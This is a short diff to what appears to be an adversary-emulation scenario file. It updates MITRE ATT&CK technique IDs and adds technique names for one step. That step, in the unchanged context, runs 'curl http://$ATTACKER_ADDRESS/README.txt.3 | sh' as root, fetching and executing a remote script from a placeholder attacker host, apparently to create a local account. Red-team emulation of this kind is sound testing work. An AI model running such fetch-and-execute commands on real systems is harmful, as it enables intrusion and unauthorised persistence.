@@ -276,8 +276,9 @@ commands:
     session: "root"
     cmd: "curl http://$ATTACKER_ADDRESS/README.txt.3 | sh"
     metadata:
-      techniques: "T1105,T1136"
+      techniques: "T1105,T1136.001"
       tactics: "Command and Control,Persistence"
+      technique_name: "Ingress Tool Transfer,Create Account: Local Account"
 
   - type: sleep
     seconds: 40
